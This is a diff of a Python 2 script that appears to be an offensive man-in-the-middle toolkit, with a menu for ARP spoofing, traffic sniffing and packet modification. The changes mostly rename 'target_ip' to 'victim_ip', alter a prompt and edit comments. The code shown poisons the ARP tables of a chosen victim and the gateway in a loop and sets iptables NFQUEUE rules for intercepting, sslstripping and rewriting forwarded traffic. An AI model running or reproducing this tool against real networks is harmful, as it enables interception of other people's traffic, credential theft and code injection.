@@ -158,34 +158,34 @@ def arp_spoofer():
         sys.exit()
     presettings()
     gateway_ip = get_gateway_ip()
-    target_ip = ""
+    victim_ip = ""
     try:
         if "n" == spoof_cmd:
             print_host_list(network_scanner(False))
-            target_ip = raw_input("Choose an 'IP' showed above: ")
+            victim_ip = raw_input("Choose an 'IP' showed above: ")
             print("ARP-spoofing started:")
             start = time.time()
             while True:
-                spoof_arp_tables(target_ip, gateway_ip)
-                spoof_arp_tables(gateway_ip, target_ip)
+                spoof_arp_tables(victim_ip, gateway_ip)
+                spoof_arp_tables(gateway_ip, victim_ip)
                 print("\rTime (in seconds) left: " + str(time.time() - start)),
                 sys.stdout.flush()
                 time.sleep(int(interval_in_seconds))
 
         elif "y" == spoof_cmd:
-            target_ip = network_scanner(True)
+            victim_ip = network_scanner(True)
             print("ARP-spoofing started:")
             start = time.time()
             while True:
-                spoof_arp_tables(target_ip, gateway_ip)
-                spoof_arp_tables(gateway_ip, target_ip)
+                spoof_arp_tables(victim_ip, gateway_ip)
+                spoof_arp_tables(gateway_ip, victim_ip)
                 print("\rTime (in seconds) left: " + str(time.time() - start)),
                 sys.stdout.flush()
                 time.sleep(int(interval_in_seconds))
     except (KeyboardInterrupt, BaseException), e:
         print("\nWARNING! Something get wrong!... Resetting ARP-tables... Please wait...")
-        restore_arp_tables(target_ip, gateway_ip)
-        restore_arp_tables(gateway_ip, target_ip)
+        restore_arp_tables(victim_ip, gateway_ip)
+        restore_arp_tables(gateway_ip, victim_ip)
         print("ARP-tables were resetting successfully!")
 # ================================= /For arp_spoofing ========================================
 # ================================= For traffic_sniffer ========================================
@@ -199,7 +199,7 @@ def traffic_sniffer():
 # ================================= /For code_injector ========================================
 def set_presets():
     preset = raw_input(
-        "To catch for modify: just transient/all&sslstrip/yours traffic (t/as/y, by default: 'y' or whatever you want for exit): ") or "y"
+        "To catch for modify: just transient/all&sslstrip/yours traffic (t/as/y or whatever you want for exit): ")
     if "t" == preset:
         subprocess.call("iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
     elif "y" or "as" == preset:
@@ -306,9 +306,9 @@ def cmd_switch():
     elif "a" == cmd:
         arp_spoofer()  # independent # needs to be a demon
     elif "t" == cmd:
-        traffic_sniffer()  # independent
+        traffic_sniffer()  # partially independent
     elif "c" == cmd:
-        packet_modificator()  # independent
+        packet_modificator()  # partially independent
     elif "e" == cmd:
         sys.exit()
     return cmd
